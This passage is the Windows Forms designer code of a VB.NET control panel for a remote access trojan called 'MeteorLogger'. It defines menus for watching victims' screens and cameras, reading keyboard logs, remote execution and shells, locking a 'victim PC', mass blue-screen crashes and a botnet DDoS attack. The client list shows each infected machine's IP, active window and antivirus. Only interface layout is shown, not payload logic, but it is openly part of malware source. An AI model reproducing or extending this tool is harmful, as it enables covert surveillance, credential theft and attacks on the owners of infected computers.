        Me.UserBlacklistToolStripMenuItem.Text = "User Blacklist"
        '
        'SurveillanceToolStripMenuItem
        '
        Me.SurveillanceToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.ScreenMonitorToolStripMenuItem, Me.CameraMonitorToolStripMenuItem, Me.KeyBoardLogToolStripMenuItem, Me.TaskManagerToolStripMenuItem})
        Me.SurveillanceToolStripMenuItem.Image = Global.WindowsApplication1.My.Resources.Resources.surveillancetab
        Me.SurveillanceToolStripMenuItem.Name = "SurveillanceToolStripMenuItem"
        Me.SurveillanceToolStripMenuItem.Size = New System.Drawing.Size(160, 22)
        Me.SurveillanceToolStripMenuItem.Text = "Surveillance"
        '
        'ScreenMonitorToolStripMenuItem
        '
        Me.ScreenMonitorToolStripMenuItem.Image = Global.WindowsApplication1.My.Resources.Resources.screen_monitor2
        Me.ScreenMonitorToolStripMenuItem.Name = "ScreenMonitorToolStripMenuItem"
        Me.ScreenMonitorToolStripMenuItem.Size = New System.Drawing.Size(180, 22)
        Me.ScreenMonitorToolStripMenuItem.Text = "Screen Monitor"
        '
        'CameraMonitorToolStripMenuItem
        '
        Me.CameraMonitorToolStripMenuItem.Image = Global.WindowsApplication1.My.Resources.Resources.surveillancetab
        Me.CameraMonitorToolStripMenuItem.Name = "CameraMonitorToolStripMenuItem"
        Me.CameraMonitorToolStripMenuItem.Size = New System.Drawing.Size(180, 22)
        Me.CameraMonitorToolStripMenuItem.Text = "Camera Monitor"
        '
        'KeyBoardLogToolStripMenuItem
        '
        Me.KeyBoardLogToolStripMenuItem.Image = Global.WindowsApplication1.My.Resources.Resources.keyboard
        Me.KeyBoardLogToolStripMenuItem.Name = "KeyBoardLogToolStripMenuItem"
        Me.KeyBoardLogToolStripMenuItem.Size = New System.Drawing.Size(180, 22)
        Me.KeyBoardLogToolStripMenuItem.Text = "KeyBoard Logs"
        '
        'TaskManagerToolStripMenuItem
        '
        Me.TaskManagerToolStripMenuItem.Name = "TaskManagerToolStripMenuItem"
        Me.TaskManagerToolStripMenuItem.Size = New System.Drawing.Size(180, 22)
        Me.TaskManagerToolStripMenuItem.Text = "Task Manager"
        '
        'ToolsToolStripMenuItem
        '
        Me.ToolsToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.RemoteFileExecuteToolStripMenuItem, Me.LaunchChatToolStripMenuItem, Me.RemoteShellToolStripMenuItem, Me.OpenURLToolStripMenuItem1, Me.LockVictimPCToolStripMenuItem})
        Me.ToolsToolStripMenuItem.Name = "ToolsToolStripMenuItem"
        Me.ToolsToolStripMenuItem.Size = New System.Drawing.Size(160, 22)
        Me.ToolsToolStripMenuItem.Text = "Tools"
        '
        'RemoteFileExecuteToolStripMenuItem
        '
        Me.RemoteFileExecuteToolStripMenuItem.Image = Global.WindowsApplication1.My.Resources.Resources.remote_upload
        Me.RemoteFileExecuteToolStripMenuItem.Name = "RemoteFileExecuteToolStripMenuItem"
        Me.RemoteFileExecuteToolStripMenuItem.Size = New System.Drawing.Size(180, 22)
        Me.RemoteFileExecuteToolStripMenuItem.Text = "Remote Execute"
        '
        'LaunchChatToolStripMenuItem
        '
        Me.LaunchChatToolStripMenuItem.Image = Global.WindowsApplication1.My.Resources.Resources.remote_chat
        Me.LaunchChatToolStripMenuItem.Name = "LaunchChatToolStripMenuItem"
        Me.LaunchChatToolStripMenuItem.Size = New System.Drawing.Size(180, 22)
        Me.LaunchChatToolStripMenuItem.Text = "Remote Chat"
        '
        'RemoteShellToolStripMenuItem
        '
        Me.RemoteShellToolStripMenuItem.Image = Global.WindowsApplication1.My.Resources.Resources.remoteshell
        Me.RemoteShellToolStripMenuItem.Name = "RemoteShellToolStripMenuItem"
        Me.RemoteShellToolStripMenuItem.Size = New System.Drawing.Size(180, 22)
        Me.RemoteShellToolStripMenuItem.Text = "Remote Shell"
        '
        'OpenURLToolStripMenuItem1
        '
        Me.OpenURLToolStripMenuItem1.Name = "OpenURLToolStripMenuItem1"
        Me.OpenURLToolStripMenuItem1.Size = New System.Drawing.Size(180, 22)
        Me.OpenURLToolStripMenuItem1.Text = "Open URL"
        '
        'LockVictimPCToolStripMenuItem
        '
        Me.LockVictimPCToolStripMenuItem.Name = "LockVictimPCToolStripMenuItem"
        Me.LockVictimPCToolStripMenuItem.Size = New System.Drawing.Size(180, 22)
        Me.LockVictimPCToolStripMenuItem.Text = "Lock Computer"
        '
        'FunToolStripMenuItem
        '
        Me.FunToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.MessageboxToolStripMenuItem, Me.CDOpenAndCloseToolStripMenuItem, Me.PlayMP3InBackgroundToolStripMenuItem})
        Me.FunToolStripMenuItem.Name = "FunToolStripMenuItem"
        Me.FunToolStripMenuItem.Size = New System.Drawing.Size(160, 22)
        Me.FunToolStripMenuItem.Text = "Fun"
        '
        'MessageboxToolStripMenuItem
        '
        Me.MessageboxToolStripMenuItem.Name = "MessageboxToolStripMenuItem"
        Me.MessageboxToolStripMenuItem.Size = New System.Drawing.Size(203, 22)
        Me.MessageboxToolStripMenuItem.Text = "Messagebox"
        '
        'CDOpenAndCloseToolStripMenuItem
        '
        Me.CDOpenAndCloseToolStripMenuItem.Name = "CDOpenAndCloseToolStripMenuItem"
        Me.CDOpenAndCloseToolStripMenuItem.Size = New System.Drawing.Size(203, 22)
        Me.CDOpenAndCloseToolStripMenuItem.Text = "CD Open And Close"
        '
        'PlayMP3InBackgroundToolStripMenuItem
        '
        Me.PlayMP3InBackgroundToolStripMenuItem.Name = "PlayMP3InBackgroundToolStripMenuItem"
        Me.PlayMP3InBackgroundToolStripMenuItem.Size = New System.Drawing.Size(203, 22)
        Me.PlayMP3InBackgroundToolStripMenuItem.Text = "Play MP3 in Background"
        '
        'ChangeSettingsToolStripMenuItem
        '
        Me.ChangeSettingsToolStripMenuItem.Name = "ChangeSettingsToolStripMenuItem"
        Me.ChangeSettingsToolStripMenuItem.Size = New System.Drawing.Size(160, 22)
        Me.ChangeSettingsToolStripMenuItem.Text = "Change Settings"
        '
        'everyoneCMS
        '
        Me.everyoneCMS.Items.AddRange(New System.Windows.Forms.ToolStripItem() {Me.ComputersToolStripMenuItem, Me.ToolsToolStripMenuItem1, Me.MassSettinsChangeToolStripMenuItem})
        Me.everyoneCMS.Name = "everyoneCMS"
        Me.everyoneCMS.Size = New System.Drawing.Size(184, 70)
        '
        'ComputersToolStripMenuItem
        '
        Me.ComputersToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.RebootAllComputersToolStripMenuItem, Me.ShutdownAllComputersToolStripMenuItem, Me.ShutdownAllRATSToolStripMenuItem, Me.RebootAllRATSToolStripMenuItem, Me.UninstallAllClientsToolStripMenuItem, Me.MassBSODToolStripMenuItem})
        Me.ComputersToolStripMenuItem.Name = "ComputersToolStripMenuItem"
        Me.ComputersToolStripMenuItem.Size = New System.Drawing.Size(183, 22)
        Me.ComputersToolStripMenuItem.Text = "Computers"
        '
        'RebootAllComputersToolStripMenuItem
        '
        Me.RebootAllComputersToolStripMenuItem.Name = "RebootAllComputersToolStripMenuItem"
        Me.RebootAllComputersToolStripMenuItem.Size = New System.Drawing.Size(191, 22)
        Me.RebootAllComputersToolStripMenuItem.Text = "Reboot All Systems"
        '
        'ShutdownAllComputersToolStripMenuItem
        '
        Me.ShutdownAllComputersToolStripMenuItem.Name = "ShutdownAllComputersToolStripMenuItem"
        Me.ShutdownAllComputersToolStripMenuItem.Size = New System.Drawing.Size(191, 22)
        Me.ShutdownAllComputersToolStripMenuItem.Text = "Shutdown All Systems"
        '
        'ShutdownAllRATSToolStripMenuItem
        '
        Me.ShutdownAllRATSToolStripMenuItem.Name = "ShutdownAllRATSToolStripMenuItem"
        Me.ShutdownAllRATSToolStripMenuItem.Size = New System.Drawing.Size(191, 22)
        Me.ShutdownAllRATSToolStripMenuItem.Text = "Shutdown All RATS"
        '
        'RebootAllRATSToolStripMenuItem
        '
        Me.RebootAllRATSToolStripMenuItem.Name = "RebootAllRATSToolStripMenuItem"
        Me.RebootAllRATSToolStripMenuItem.Size = New System.Drawing.Size(191, 22)
        Me.RebootAllRATSToolStripMenuItem.Text = "Reboot All RATS"
        '
        'UninstallAllClientsToolStripMenuItem
        '
        Me.UninstallAllClientsToolStripMenuItem.Name = "UninstallAllClientsToolStripMenuItem"
        Me.UninstallAllClientsToolStripMenuItem.Size = New System.Drawing.Size(191, 22)
        Me.UninstallAllClientsToolStripMenuItem.Text = "Uninstall All RATS"
        '
        'MassBSODToolStripMenuItem
        '
        Me.MassBSODToolStripMenuItem.Name = "MassBSODToolStripMenuItem"
        Me.MassBSODToolStripMenuItem.Size = New System.Drawing.Size(191, 22)
        Me.MassBSODToolStripMenuItem.Text = "Mass BSOD"
        '
        'ToolsToolStripMenuItem1
        '
        Me.ToolsToolStripMenuItem1.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.MassRemoteExecuteToolStripMenuItem, Me.MassRemoteCMDToolStripMenuItem, Me.MassOpenURLToolStripMenuItem, Me.MassDDoSAttackBOTNETToolStripMenuItem, Me.MassMessageBoxToolStripMenuItem})
        Me.ToolsToolStripMenuItem1.Name = "ToolsToolStripMenuItem1"
        Me.ToolsToolStripMenuItem1.Size = New System.Drawing.Size(183, 22)
        Me.ToolsToolStripMenuItem1.Text = "Tools"
        '
        'MassRemoteExecuteToolStripMenuItem
        '
        Me.MassRemoteExecuteToolStripMenuItem.Name = "MassRemoteExecuteToolStripMenuItem"
        Me.MassRemoteExecuteToolStripMenuItem.Size = New System.Drawing.Size(223, 22)
        Me.MassRemoteExecuteToolStripMenuItem.Text = "Mass Remote Execute"
        '
        'MassRemoteCMDToolStripMenuItem
        '
        Me.MassRemoteCMDToolStripMenuItem.Name = "MassRemoteCMDToolStripMenuItem"
        Me.MassRemoteCMDToolStripMenuItem.Size = New System.Drawing.Size(223, 22)
        Me.MassRemoteCMDToolStripMenuItem.Text = "Mass Remote CMD"
        '
        'MassOpenURLToolStripMenuItem
        '
        Me.MassOpenURLToolStripMenuItem.Name = "MassOpenURLToolStripMenuItem"
        Me.MassOpenURLToolStripMenuItem.Size = New System.Drawing.Size(223, 22)
        Me.MassOpenURLToolStripMenuItem.Text = "Mass Open URL"
        '
        'MassDDoSAttackBOTNETToolStripMenuItem
        '
        Me.MassDDoSAttackBOTNETToolStripMenuItem.Name = "MassDDoSAttackBOTNETToolStripMenuItem"
        Me.MassDDoSAttackBOTNETToolStripMenuItem.Size = New System.Drawing.Size(223, 22)
        Me.MassDDoSAttackBOTNETToolStripMenuItem.Text = "Mass DDoS Attack [BOTNET]"
        '
        'MassMessageBoxToolStripMenuItem
        '
        Me.MassMessageBoxToolStripMenuItem.Name = "MassMessageBoxToolStripMenuItem"
        Me.MassMessageBoxToolStripMenuItem.Size = New System.Drawing.Size(223, 22)
        Me.MassMessageBoxToolStripMenuItem.Text = "Mass MessageBox"
        '
        'MassSettinsChangeToolStripMenuItem
        '
        Me.MassSettinsChangeToolStripMenuItem.Name = "MassSettinsChangeToolStripMenuItem"
        Me.MassSettinsChangeToolStripMenuItem.Size = New System.Drawing.Size(183, 22)
        Me.MassSettinsChangeToolStripMenuItem.Text = "Mass Settins Change"
        '
        'RatPanel
        '
        Me.AutoScaleDimensions = New System.Drawing.SizeF(6.0!, 13.0!)
        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
        Me.ClientSize = New System.Drawing.Size(832, 408)
        Me.Controls.Add(Me.PingButton)
        Me.Controls.Add(Me.clientListLBL)
        Me.Controls.Add(Me.Panel)
        Me.Name = "RatPanel"
        Me.Text = "MeteorLogger - PANEL"
        Me.Panel.ResumeLayout(False)
        Me.ClientsTab.ResumeLayout(False)
        CType(Me.connectedClientsView, System.ComponentModel.ISupportInitialize).EndInit()
        Me.ConfigTab.ResumeLayout(False)
        Me.GroupBox5.ResumeLayout(False)
        Me.GroupBox5.PerformLayout()
        Me.GroupBox4.ResumeLayout(False)
        Me.GroupBox4.PerformLayout()
        Me.GroupBox3.ResumeLayout(False)
        Me.GroupBox3.PerformLayout()
        Me.GroupBox2.ResumeLayout(False)
        Me.GroupBox1.ResumeLayout(False)
        Me.GroupBox1.PerformLayout()
        Me.BuilderTab.ResumeLayout(False)
        Me.BuilderTab.PerformLayout()
        Me.optionsCMS.ResumeLayout(False)
        Me.everyoneCMS.ResumeLayout(False)
        Me.ResumeLayout(False)
        Me.PerformLayout()

    End Sub
    Friend WithEvents ClientListManager As System.ComponentModel.BackgroundWorker
    Friend WithEvents ClientListTimer As System.Windows.Forms.Timer
    Friend WithEvents Panel As System.Windows.Forms.TabControl
    Friend WithEvents ClientsTab As System.Windows.Forms.TabPage
    Friend WithEvents BuilderTab As System.Windows.Forms.TabPage
    Friend WithEvents StatusStrip1 As System.Windows.Forms.StatusStrip
    Friend WithEvents clientListLBL As System.Windows.Forms.Label
    Friend WithEvents connectedClientsView As System.Windows.Forms.DataGridView
    Friend WithEvents BuildButton As System.Windows.Forms.Button
    Friend WithEvents ConfigTab As TabPage
    Friend WithEvents Label1 As Label
    Friend WithEvents Log As ListBox
    Friend WithEvents PingButton As Button
    Friend WithEvents optionsCMS As ContextMenuStrip
    Friend WithEvents ClientToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents ShutdownToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents RebootToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents SurveillanceToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents ScreenMonitorToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents RATShutdownToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents RATUninstallToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents CameraMonitorToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents KeyBoardLogToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents ToolsToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents RemoteFileExecuteToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents LaunchChatToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents GroupBox2 As GroupBox
    Friend WithEvents ComboBox1 As ComboBox
    Friend WithEvents GroupBox1 As GroupBox
    Friend WithEvents TextBox1 As TextBox
    Friend WithEvents Button1 As Button
    Friend WithEvents GroupBox3 As GroupBox
    Friend WithEvents Label2 As Label
    Friend WithEvents ComboBox2 As ComboBox
    Friend WithEvents CheckBox1 As CheckBox
    Friend WithEvents GroupBox4 As GroupBox
    Friend WithEvents CheckBox11 As CheckBox
    Friend WithEvents CheckBox10 As CheckBox
    Friend WithEvents CheckBox9 As CheckBox
    Friend WithEvents CheckBox8 As CheckBox
    Friend WithEvents CheckBox7 As CheckBox
    Friend WithEvents CheckBox6 As CheckBox
    Friend WithEvents CheckBox5 As CheckBox
    Friend WithEvents CheckBox4 As CheckBox
    Friend WithEvents CheckBox3 As CheckBox
    Friend WithEvents CheckBox2 As CheckBox
    Friend WithEvents Label4 As Label
    Friend WithEvents Label3 As Label
    Friend WithEvents ComboBox3 As ComboBox
    Friend WithEvents CheckBox13 As CheckBox
    Friend WithEvents CheckBox12 As CheckBox
    Friend WithEvents RATRebootToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents RemoteShellToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents IP As DataGridViewTextBoxColumn
    Friend WithEvents CPU As DataGridViewTextBoxColumn
    Friend WithEvents RAM As DataGridViewTextBoxColumn
    Friend WithEvents PING As DataGridViewTextBoxColumn
    Friend WithEvents ACTIVEWINDOW As DataGridViewTextBoxColumn
    Friend WithEvents UPTIME As DataGridViewTextBoxColumn
    Friend WithEvents softwarename As DataGridViewTextBoxColumn
    Friend WithEvents antivirus As DataGridViewTextBoxColumn
    Friend WithEvents FunToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents MessageboxToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents GroupBox5 As GroupBox
    Friend WithEvents TextBox2 As TextBox
    Friend WithEvents BSODCrashToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents OpenURLToolStripMenuItem1 As ToolStripMenuItem
    Friend WithEvents ChangeSettingsToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents everyoneCMS As ContextMenuStrip
    Friend WithEvents ComputersToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents RebootAllComputersToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents ShutdownAllComputersToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents ShutdownAllRATSToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents RebootAllRATSToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents UninstallAllClientsToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents MassBSODToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents ToolsToolStripMenuItem1 As ToolStripMenuItem
    Friend WithEvents MassRemoteExecuteToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents MassRemoteCMDToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents MassOpenURLToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents MassDDoSAttackBOTNETToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents MassMessageBoxToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents MassSettinsChangeToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents UserBlacklistToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents CDOpenAndCloseToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents PlayMP3InBackgroundToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents LockVictimPCToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents TaskManagerToolStripMenuItem As ToolStripMenuItem
End Class
